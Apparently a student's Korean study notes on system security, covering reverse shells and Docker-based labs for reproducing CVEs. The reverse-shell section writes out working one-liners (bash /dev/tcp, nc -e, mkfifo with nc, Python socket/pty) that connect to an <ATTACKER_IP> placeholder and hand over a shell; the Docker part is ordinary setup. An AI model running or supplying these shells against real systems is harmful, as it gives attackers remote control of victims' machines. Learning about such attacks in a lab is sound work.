---
layout: default
title: "System 보안 1일차"
parent: System
nav_order: 1
---

# Reverse Shell 정리

## 1. 리버스 쉘 개요

### 리버스 쉘이란?

- 피해자 시스템이 공격자에게 접속하여 쉘을 제공하는 방식
- 방화벽/NAT 환경에서 **바인드 쉘보다 우회가 쉬움**

### 기본 구조

```
[공격자 PC]  ← 연결 ←  [피해자 시스템]
     nc                     bash / sh / python
```

------

## 2. 기본 동작 흐름

### 1) 공격자 PC (리스너 대기)

```
nc -lvp <PORT>
```

### 2) 피해자 시스템 (쉘 연결 시도)

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

------

## 3. Bash 기반 리버스 쉘

### /dev/tcp 사용

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

- Bash 내장 기능
- `/dev/tcp` 지원 환경에서만 동작

------

## 4. Netcat (nc) 기반 리버스 쉘

### -e 옵션 사용 (구버전 nc)

```
nc <ATTACKER_IP> <PORT> -e /bin/bash
```

### -C 옵션 사용 (환경에 따라)

```
nc <ATTACKER_IP> <PORT> -C /bin/bash
```

- 일부 최신 nc에서는 `-e` 옵션 제거됨
- 환경 의존성이 큼

------

## 5. FIFO(named pipe) 기반 리버스 쉘

### mkfifo 사용

```
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### 특징

- `-e` 옵션이 없는 nc에서도 동작
- 비교적 범용적인 방식

------

## 6. Python 기반 리버스 쉘

### Python + socket + pty

```
python -c '
import socket, os, pty
s = socket.socket()
s.connect(("<ATTACKER_IP>", <PORT>))
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
'
```

### 장점

- TTY 지원 (`pty.spawn`)
- 안정적인 인터랙티브 쉘 제공
- Python이 설치된 대부분의 환경에서 사용 가능

------

## 7. 공격자 측 Netcat 리스너 예시

```
nc -lvp 8888
```

또는 특정 IP 바인딩

```
nc -lvp 8888 -s <ATTACKER_IP>
```

------

## 8. 방식별 요약 비교

| 방식            | 조건         | 특징        |
| --------------- | ------------ | ----------- |
| Bash `/dev/tcp` | Bash 지원    | 가장 간단   |
| nc `-e`         | 구버전 nc    | 직관적      |
| FIFO + nc       | nc 제한 환경 | 범용성 높음 |
| Python          | Python 설치  | 안정적 TTY  |

------

## 9. 실습 시 주의사항

- 방화벽 / 보안 솔루션에 의해 차단될 수 있음
- TTY 없는 쉘은 명령 실행이 불편함
- 권한은 **피해자 프로세스 권한 그대로** 획득됨

------

## 10. 한 줄 정리

> 리버스 쉘은 **피해자가 공격자에게 접속하는 구조**이며,
>  환경에 따라 Bash, nc, FIFO, Python 등 다양한 방식으로 구현할 수 있다.

---

# Docker 환경 구축 및 CVE 실습 정리

## 1. Docker 기본 환경 구축

### 1.1 Docker 파일 위치로 이동

```
cd {Dockerfile이 있는 경로}
```

### 1.2 이미지 빌드

```
docker build -t test:0.1 .
```

- `-t test:0.1`
  - 이미지 이름: `test`
  - 태그: `0.1`

### 1.3 컨테이너 실행

```
docker run -p 80:3000 test:0.1
```

- `-p 80:3000`
  - 호스트 포트 `80`
  - 컨테이너 내부 포트 `3000`

### 1.4 접속 확인

- 브라우저 접속

```
http://localhost
```

------

## 2. CVE 실습용 Docker 환경 구축 개요

### 목적

- 취약한 환경을 **로컬 Docker 컨테이너**로 재현
- 실제 공격 시나리오를 안전하게 실습

### 기본 흐름

```
Dockerfile 작성
→ 이미지 빌드
→ 취약 서비스 실행
→ PoC / 공격 코드 실행
→ 취약점 확인
```

------

## 3. CVE 실습 대상 목록

### 3.1 CVE-2025-29927

- 유형: (예시)
  - 인증 우회 / 로직 취약점 / 입력 검증 오류
- 실습 목표
  - 취약 버전 서비스 Docker로 구성
  - PoC 요청 재현
  - 응답 차이 확인

------

### 3.2 CVE-2024-55879

- 유형: (예시)
  - 원격 코드 실행 (RCE)
  - 파일 처리 취약점
- 실습 목표
  - 취약 라이브러리 포함 이미지 구성
  - 악성 입력 전달
  - 코드 실행 여부 확인

------

### 3.3 CVE-2025-1302

- 유형: (예시)
  - 접근 제어 미흡
  - 권한 상승
- 실습 목표
  - 권한 없는 사용자 요청
  - 제한된 기능 접근 여부 검증

------

## 4. CVE 실습용 Dockerfile 기본 템플릿

```
FROM node:18

WORKDIR /app

COPY . .

RUN npm install

EXPOSE 3000

CMD ["npm", "start"]
```

- CVE 실습 시
  - **취약 버전 명시**
  - 보안 패치 미적용 상태 유지

------

## 5. 실습 시 권장 옵션

### 백그라운드 실행

```
docker run -d -p 80:3000 test:0.1
```

### 컨테이너 내부 접속

```
docker exec -it <컨테이너ID> /bin/bash
```

### 로그 확인

```
docker logs <컨테이너ID>
```

------

## 6. 실습 환경 정리

### 컨테이너 목록

```
docker ps
```

### 중지

```
docker stop <컨테이너ID>
```

### 삭제

```
docker rm <컨테이너ID>
docker rmi test:0.1
```
